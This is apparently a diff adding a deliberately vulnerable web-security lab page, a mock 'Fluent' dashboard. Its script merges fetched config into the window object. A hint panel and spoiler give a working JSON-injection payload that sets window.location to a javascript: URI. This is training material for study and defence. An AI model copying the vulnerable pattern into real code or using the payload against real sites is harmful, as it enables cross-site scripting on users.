@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fluent - Team Collaboration</title>
+  <link rel="stylesheet" href="/labs/elmahdi/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',-apple-system,sans-serif;background:#f5f3ff;color:#1e1b4b;min-height:100vh}
+    .nav{background:#fff;border-bottom:1px solid #e9d5ff;height:58px;display:flex;align-items:center;padding:0 28px;justify-content:space-between}
+    .nav-brand{font-weight:800;font-size:17px;display:flex;align-items:center;gap:8px}
+    .nav-brand .dot{width:10px;height:10px;background:linear-gradient(135deg,#8b5cf6,#ec4899);border-radius:50%}
+    .nav-links{display:flex;gap:20px;font-size:13px}
+    .nav-links a{color:#64748b;text-decoration:none;font-weight:500}
+    .nav-links a.active{color:#8b5cf6}
+    .layout{display:flex;min-height:calc(100vh - 58px)}
+    .sidebar{width:240px;background:#fff;border-right:1px solid #e9d5ff;padding:20px}
+    .sb-section{margin-bottom:24px}
+    .sb-label{font-size:10px;font-weight:700;color:#a78bfa;text-transform:uppercase;letter-spacing:0.08em;margin-bottom:8px}
+    .sb-item{padding:7px 10px;font-size:13px;color:#475569;border-radius:7px;cursor:pointer;font-weight:500;display:flex;align-items:center;gap:8px}
+    .sb-item:hover{background:#faf5ff}
+    .sb-item.active{background:#ede9fe;color:#7c3aed}
+    .main{flex:1;padding:32px 40px}
+    .page-head{margin-bottom:28px}
+    .page-head h1{font-size:24px;font-weight:700;margin-bottom:4px}
+    .page-head p{font-size:13px;color:#64748b}
+    .info-card{background:#fff;border:1px solid #e9d5ff;border-radius:12px;padding:20px;margin-bottom:14px}
+    .info-card h3{font-size:14px;font-weight:700;margin-bottom:10px;color:#6d28d9}
+    .kv-grid{display:grid;grid-template-columns:120px 1fr;gap:6px 16px;font-size:13px}
+    .kv-grid .k{color:#94a3b8;font-weight:500}
+    .kv-grid .v{color:#1e1b4b;font-family:'Fira Code',Consolas,monospace;font-size:12px;word-break:break-all}
+    .cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px}
+    .stat{background:#fff;border:1px solid #e9d5ff;border-radius:10px;padding:16px}
+    .stat-label{font-size:11px;color:#a78bfa;font-weight:600;text-transform:uppercase}
+    .stat-value{font-size:22px;font-weight:800;margin-top:4px}
+    .raw-json{background:#1e1b4b;color:#c7d2fe;padding:14px;border-radius:8px;font-family:'Fira Code',monospace;font-size:12px;overflow-x:auto;margin-top:10px;max-height:240px;overflow-y:auto}
+  </style>
+</head>
+<body>
+  <div class="nav">
+    <div class="nav-brand"><div class="dot"></div>Fluent</div>
+    <div class="nav-links">
+      <a href="#">Home</a>
+      <a href="#" class="active">Dashboard</a>
+      <a href="#">Channels</a>
+      <a href="#">Settings</a>
+    </div>
+  </div>
+
+  <div class="layout">
+    <div class="sidebar">
+      <div class="sb-section">
+        <div class="sb-label">Workspace</div>
+        <div class="sb-item active">📊 Dashboard</div>
+        <div class="sb-item">💬 Channels</div>
+        <div class="sb-item">👥 People</div>
+        <div class="sb-item">📁 Files</div>
+      </div>
+      <div class="sb-section">
+        <div class="sb-label">Tools</div>
+        <div class="sb-item">🔔 Notifications</div>
+        <div class="sb-item">📌 Bookmarks</div>
+        <div class="sb-item">⚙️ Preferences</div>
+      </div>
+    </div>
+
+    <div class="main">
+      <div class="page-head">
+        <h1>Welcome back</h1>
+        <p>Your workspace overview · Configuration loaded from /api/config</p>
+      </div>
+
+      <div class="cards">
+        <div class="stat"><div class="stat-label">Active Members</div><div class="stat-value">42</div></div>
+        <div class="stat"><div class="stat-label">Messages Today</div><div class="stat-value">1,284</div></div>
+        <div class="stat"><div class="stat-label">Version</div><div class="stat-value" id="version-display">—</div></div>
+      </div>
+
+      <div class="info-card">
+        <h3>Live Configuration</h3>
+        <div class="kv-grid" id="config-display">
+          <div class="k">Version</div><div class="v" id="cfg-version">loading...</div>
+          <div class="k">Base URL</div><div class="v" id="cfg-baseurl">loading...</div>
+          <div class="k">Timeout</div><div class="v" id="cfg-timeout">loading...</div>
+          <div class="k">Dark Mode</div><div class="v" id="cfg-dark">loading...</div>
+          <div class="k">Beta</div><div class="v" id="cfg-beta">loading...</div>
+        </div>
+      </div>
+
+      <div class="info-card">
+        <h3>Raw API Response (/api/config?v=...)</h3>
+        <p style="font-size:12px;color:#94a3b8;margin-bottom:8px">Tip: change the <code>v</code> URL parameter and reload</p>
+        <pre class="raw-json" id="raw-json">Loading...</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- VULNERABLE CODE -->
+  <script>
+    /**
+     * Fluent App Bootstrap
+     * Loads workspace configuration from /api/config and merges it into window
+     * for other modules to consume.
+     */
+    (function() {
+      const params = new URLSearchParams(location.search);
+      const version = params.get('v') || '1.0';
+
+      // Fetch config with ?v= passthrough for versioning
+      fetch('/elmahdi/api/config?v=' + encodeURIComponent(version))
+        .then(function(r) { return r.text(); })
+        .then(function(rawText) {
+          document.getElementById('raw-json').textContent = rawText;
+
+          let config;
+          try {
+            config = JSON.parse(rawText);
+          } catch (e) {
+            console.error('Config parse error', e);
+            return;
+          }
+
+          // Apply config values to the UI
+          document.getElementById('version-display').textContent = config.version || 'unknown';
+          document.getElementById('cfg-version').textContent = config.version || '?';
+          if (config.api) {
+            document.getElementById('cfg-baseurl').textContent = config.api.baseUrl || '?';
+            document.getElementById('cfg-timeout').textContent = config.api.timeout || '?';
+          }
+          if (config.features) {
+            document.getElementById('cfg-dark').textContent = String(config.features.darkMode);
+            document.getElementById('cfg-beta').textContent = String(config.features.beta);
+          }
+
+          // DANGEROUS PATTERN: apply window-scoped config
+          // If the config JSON contains a "window" key, it's merged into the global window object.
+          // Useful for feature flags like window.featureFlags, but VULNERABLE if the JSON can be
+          // controlled to include sensitive keys like window.location.
+          if (config.window) {
+            Object.assign(window, config.window);
+          }
+        })
+        .catch(function(e) {
+          document.getElementById('raw-json').textContent = 'Fetch error: ' + e.message;
+        });
+    })();
+  </script>
+
+  <!-- Hint panel -->
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: JSON Injection via Querystring</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The page fetches a config endpoint that reflects the <code>v</code> query parameter into the response JSON without escaping. You can break out of the JSON structure and inject new top-level keys. One of those keys gets merged into <code>window</code>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">1</div>
+          <span>Probe the config endpoint</span>
+          <span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Try <code>/elmahdi/api/config?v=test</code> directly in your browser. See how <code>v</code> is reflected into the JSON response. Now try <code>v=test"</code> &mdash; does the quote come back escaped?
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">2</div>
+          <span>Understand the parse path</span>
+          <span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The client does <code>JSON.parse(rawText)</code>. Your payload must keep the JSON <strong>valid</strong> while injecting new structure. That means balancing braces and brackets.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">3</div>
+          <span>Find the dangerous sink</span>
+          <span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Search the bootstrap script for something like <code>Object.assign(window, config.window)</code>. If you can inject a <code>"window"</code> key into the config, its contents get merged into <code>window</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">4</div>
+          <span>What to overwrite on window</span>
+          <span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Assigning to <code>window.location</code> (as a string) navigates the browser to that URL. <code>javascript:</code> URIs execute code: <code>window.location = "javascript:alert(1)"</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">5</div>
+          <span>Plan the structural breakout</span>
+          <span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The template is:
+          <pre><code>{
+  "version": "YOUR_INPUT",
+  "features": { ... },
+  "api": { ... }
+}</code></pre>
+          You need to close the <code>version</code> string, close the outer object, inject a comma, add <code>"window": { "location": "javascript:..." }</code>, then re-open something so the original trailing JSON is still syntactically valid when concatenated. A common trick: wrap the rest in a dummy key whose value starts opening a string that never closes, then let the trailing <code>"</code> from the template close it.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">
+          🚩 Full Solution (spoiler)
+        </button>
+        <div class="hint-spoiler-content">
+          <p>Navigate to:</p>
+          <pre>/elmahdi/app?v=1","window":{"location":"javascript:alert('JSON_INJECTION')"},"x":"</pre>
+          <p>The resulting JSON body becomes:</p>
+          <pre>{
+  "version": "1","window":{"location":"javascript:alert('JSON_INJECTION')"},"x":"",
+  "features": {...},
+  "api": {...}
+}</pre>
+          <p>This is valid JSON. <code>config.window</code> is now <code>{"location":"javascript:..."}</code>, and <code>Object.assign(window, config.window)</code> sets <code>window.location</code>, triggering navigation to the <code>javascript:</code> URI.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('elmahdi-json-injection', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
